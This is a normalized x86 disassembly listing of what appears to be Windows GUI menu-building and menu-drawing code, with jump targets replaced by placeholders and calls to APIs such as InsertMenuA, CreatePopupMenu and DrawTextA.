cmp [ ebp - 0x16 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x10 ]
jg r-xdata
mov [ ebp - 0x1 ] 0xff
mov [ ebp - 0x15 ] 0xff
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jg r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_446604
mov al [ eax + 0x3f ]
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
cmp al [ ebp - 0x15 ]
ja r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_446604
mov al [ eax + 0x3f ]
mov [ ebp - 0x15 ] al
mov al [ ebp - 0x15 ]
mov [ ebp - 0x1 ] al
push ebp
lea eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
call sub_444054
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
push ebp
lea eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
call sub_444054
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_446604
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_446604
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
inc [ ebp - 0x10 ]
jmp r-xdata
inc [ ebp - 0x14 ]
sub_444200
push ebx
mov ebx eax
mov eax ebx
call sub_440da8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032a8
mov edx [ eax + 0x64 ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x30 ]
call sub_449110
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_444238
push ebx
mov ebx eax
mov eax ebx
call sub_440dbc
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032a8
mov al [ eax + 0x69 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x38 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_444268
push ebx
mov ebx eax
mov eax ebx
call sub_440dd0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032a8
mov al [ eax + 0x6a ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x39 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_444298
push ebx
mov ebx eax
mov eax ebx
call sub_440df8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032a8
mov eax [ eax + 0x74 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x54 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4442c8
push ebx
mov ebx eax
mov eax ebx
call sub_440e20
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032a8
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x58 ]
call sub_4042c0
je r-xdata
mov al 0x1
pop ebx
retn
sub_4442fc
push ebx
mov ebx eax
mov eax [ ebx + 0x18 ]
cmp [ eax + 0x3d ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_440de4
test al al
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032a8
mov eax [ eax + 0x6c ]
mov edx [ ebx + 0x18 ]
movzx edx [ edx + 0x3f ]
cmp eax edx
je r-xdata
mov al 0x1
pop ebx
retn
sub_444338
push ebx
mov ebx eax
mov eax ebx
call sub_440e34
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032a8
mov eax [ eax + 0x80 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44436c
push ebx
mov ebx eax
mov eax ebx
call sub_440e48
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032a8
mov ax [ eax + 0x84 ]
mov edx [ ebx + 0x18 ]
cmp ax [ edx + 0x60 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4443a0
push ebx
mov ebx eax
mov eax ebx
call sub_440e5c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032a8
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x3e ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4443d4
push ebx
mov ebx eax
mov eax ebx
call sub_41a5cc
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x88 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4443fc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0xa8 ] bl
sub_44441c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_44645c
sub_44443c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_4464cc
sub_44445c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_446520
sub_44447c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov [ eax + 0x54 ] esi
sub_444498
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x58
mov edx esi
call sub_403f08
sub_4444bc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_44664c
sub_4444dc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_446628
sub_4444fc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_44663c
sub_44451c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x88 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x8c ] edx
sub_444548
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_419cdc
mov [ ebx + 0x3e ] 0x1
mov [ ebx + 0x39 ] 0x1
mov [ ebx + 0x3b ] 0x2
mov [ ebx + 0x3c ] 0x2
call sub_444034
mov [ ebx + 0x50 ] ax
mov [ ebx + 0x40 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov esi eax
mov [ ebx + 0x78 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_446f58
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_4445c4
push ebx
push esi
call sub_40346c
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_448ef4
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
mov eax esi
call sub_4465f4
test eax eax
jg r-xdata
mov edx esi
call sub_44698c
xor eax eax
mov [ esi + 0x64 ] eax
jmp r-xdata
xor edx edx
mov eax esi
call sub_446604
call sub_4030f8
cmp [ esi + 0x34 ] 0x0
je r-xdata
mov eax [ esi + 0x5c ]
call sub_4030f8
lea eax [ esi + 0x44 ]
call sub_40cc80
lea eax [ esi + 0x78 ]
call sub_40cc80
mov ax [ esi + 0x50 ]
test ax ax
je r-xdata
xor edx edx
mov eax esi
call sub_4449e0
mov eax [ esi + 0x34 ]
push eax
call DestroyMenu
mov eax [ esi + 0x4c ]
test eax eax
je r-xdata
movzx edx ax
xor ecx ecx
mov eax [ rw-data ]
call sub_413f5c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419d28
test bl bl
jle r-xdata
call sub_4030f8
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_444678
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x1 ] cl
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4448d3
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x3e ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4448da
lea eax [ ebp - 0x40 ]
call sub_403eb4
lea eax [ ebp - 0x8 ]
call sub_403eb4
retn
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x30 ]
call sub_403f4c
mov eax ebx
call sub_4465f4
test eax eax
jle r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
mov eax ebx
call sub_444b88
mov [ ebp - 0x25 ] eax
jmp r-xdata
call GetVersion
and eax 0xff
cmp ax 0x4
jb r-xdata
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_4042c0
sete al
and eax 0x7f
mov esi [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x48 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x38 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
or esi eax
or esi 0x400
mov eax ebx
call sub_4465f4
test eax eax
jle r-xdata
mov [ ebp - 0x39 ] 0x2c
mov [ ebp - 0x35 ] 0x3f
mov eax ebx
call sub_446bb0
mov esi eax
test esi esi
je r-xdata
push [ ebp - 0x8 ]
push r-xdata
lea edx [ ebp - 0x40 ]
mov ax [ ebx + 0x60 ]
call sub_443cdc
push [ ebp - 0x40 ]
lea eax [ ebp - 0x8 ]
mov edx 0x3
call sub_404234
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_404374
push eax
movzx eax [ ebx + 0x50 ]
push eax
push esi
push 0xffffffff
push edi
call InsertMenuA
mov eax [ ebx + 0x30 ]
call sub_404374
push eax
mov eax ebx
call sub_444b88
push eax
or esi 0x10
push esi
push 0xffffffff
push edi
call InsertMenuA
jmp r-xdata
cmp [ ebx + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0x40 ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_403284
test al al
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_4461cc
test eax eax
jne r-xdata
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_4042c0
sete al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3d ]
mov edx [ edx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x48 ]
or edx [ ecx * 4 + rw-data ]
or eax edx
xor edx edx
mov dl [ ebp - 0x1 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebp - 0x9 ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x31 ] eax
xor eax eax
mov al [ ebx + 0x38 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3a ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x2d ] eax
movzx eax [ ebx + 0x50 ]
mov [ ebp - 0x29 ] eax
xor eax eax
mov [ ebp - 0x25 ] eax
xor eax eax
mov [ ebp - 0x21 ] eax
xor eax eax
mov [ ebp - 0x1d ] eax
mov eax [ ebp - 0x8 ]
call sub_404374
mov [ ebp - 0x15 ] eax
mov eax ebx
call sub_4465f4
test eax eax
jle r-xdata
lea eax [ ebp - 0x39 ]
push eax
push 0xffffffff
push 0xffffffff
push edi
call InsertMenuItemA
jmp r-xdata
mov eax ebx
call sub_444b88
mov [ ebp - 0x25 ] eax
sub_4448f3
inc [ ecx ]
add [ eax ] al
add [ 0x55000000 ] ch
mov ebp esp
mov edx [ ebp + 0x8 ]
mov cl [ edx - 0x5 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x34 ]
call sub_444678
xor eax eax
pop ebp
retn
sub_444918
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_4481ec
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4471b4
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4476b0
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax r-xdata
mov ecx [ ebp - 0x4 ]
call sub_4440b4
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_444988
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4449d2
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_418904
mov eax [ ebp - 0x4 ]
call sub_443f3c
mov edx eax
mov eax ebx
call sub_446628
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4449d9
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
sub_4449e0
push ebx
mov ebx eax
test edx edx
je r-xdata
mov eax [ ebx + 0x68 ]
cmp edx eax
je r-xdata
test [ edx + 0x1c ] 0x8
jne r-xdata
pop ebx
retn
test eax eax
je r-xdata
mov eax edx
mov [ ebx + 0x68 ] eax
test eax eax
je r-xdata
xor ecx ecx
mov [ eax + 0x6c ] ecx
mov eax ebx
call sub_444a58
mov [ eax + 0x6c ] ebx
mov edx ebx
call sub_419dac
sub_444a1c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_41a12c
mov eax ebx
call sub_4465dc
test eax eax
je r-xdata
cmp [ ebx + 0x74 ] 0x0
je r-xdata
mov eax ebx
call sub_4465dc
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_4032f4
pop esi
pop ebx
retn
mov eax ebx
call sub_444a58
sub_444a58
push ebx
push esi
push edi
push ebp
mov ebp eax
test [ ebp + 0x1c ] 0x8
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebp + 0x1c ] 0x2
je r-xdata
mov eax [ ebp + 0x6c ]
test eax eax
je r-xdata
mov [ ebp + 0x74 ] 0x1
jmp r-xdata
mov eax ebp
call sub_444b88
push eax
call GetMenuItemCount
mov esi eax
test esi esi
sete bl
test esi esi
jle r-xdata
call sub_444a58
jmp r-xdata
test bl bl
je r-xdata
push 0x400
mov edi esi
dec edi
push edi
mov eax ebp
call sub_444b88
push eax
call GetMenuState
test al 0x4
jne r-xdata
cmp [ ebp + 0x64 ] 0x0
jne r-xdata
dec esi
test esi esi
jg r-xdata
push 0x400
push edi
mov eax ebp
call sub_444b88
push eax
call RemoveMenu
mov bl 0x1
mov eax ebp
call sub_444918
mov eax [ ebp + 0x70 ]
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
mov eax ebp
call sub_444b88
push eax
call GetMenuItemCount
test eax eax
jne r-xdata
mov eax [ ebp + 0x34 ]
push eax
call DestroyMenu
xor eax eax
mov [ ebp + 0x34 ] eax
jmp r-xdata
xor edx edx
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_444b28
push ebx
push esi
push edi
push ebp
push ecx
mov ebx ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_4465f4
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx ebp
mov eax edi
call sub_446604
cmp bl [ eax + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax edi
call sub_446604
cmp bl [ eax + 0x3f ]
jae r-xdata
inc ebp
dec esi
jne r-xdata
mov edx ebp
mov eax edi
call sub_446604
mov [ eax + 0x3f ] bl
mov eax [ rw-data ]
call sub_443c30
jmp r-xdata
cmp ebp [ esp ]
jge r-xdata
sub_444b88
push ebx
mov ebx eax
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov eax [ ebx + 0x34 ]
pop ebx
retn
mov eax [ ebx + 0x4 ]
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
call CreateMenu
mov [ ebx + 0x34 ] eax
call CreatePopupMenu
mov [ ebx + 0x34 ] eax
jmp r-xdata
mov eax ebx
call sub_444918
mov eax [ rw-data ]
call sub_443c30
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
sub_444bd4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41a054
push ebx
push sub_444988
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_444c18
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_444dfc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_446bb0
mov edi eax
test edi edi
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_403f4c
test bh 0x4
je r-xdata
mov eax edi
call sub_4481ec
test al al
je r-xdata
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4042c0
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
test bl 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_41d610
cmp [ esi + 0x3a ] 0x0
je r-xdata
test bh 0x4
jne r-xdata
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_40417c
mov eax [ ebp - 0xc ]
cmp [ eax ] 0x26
jne r-xdata
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
and ebx 0xffffffff
or ebx 0x2
jmp r-xdata
cmp [ esi + 0x39 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0xc ]
mov eax edi
call sub_41cfe8
mov edx eax
or dl [ r-xdata ]
mov eax edi
call sub_41cff4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444e03
lea eax [ ebp - 0xc ]
call sub_403eb4
retn
mov eax [ ebp + 0x10 ]
mov esi eax
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add [ ebp - 0x18 ] 0x4
push 0x2
push 0x6
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_41dbbc
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
or ebx 0x20000
and ebx 0xfffffffd
or ebx 0x0
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_404174
push eax
mov eax [ ebp - 0xc ]
call sub_404374
push eax
mov eax [ ebp - 0x4 ]
call sub_41dbbc
push eax
call DrawTextA
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_41cd28
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_404174
push eax
mov eax [ ebp - 0xc ]
call sub_404374
push eax
mov eax [ ebp - 0x4 ]
call sub_41dbbc
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_41cd28
mov eax 0xff00000d
call sub_41c868
mov esi eax
mov eax 0xff000010
call sub_41c868
cmp esi eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_41cd28
jmp r-xdata
sub_444e68
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_445750
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d898
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_41d4f4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_41cd28
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_4042c0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_41d4f4
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d898
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0xfffffffc
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_441c2c
cmp ebx eax
jl r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41dbbc
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
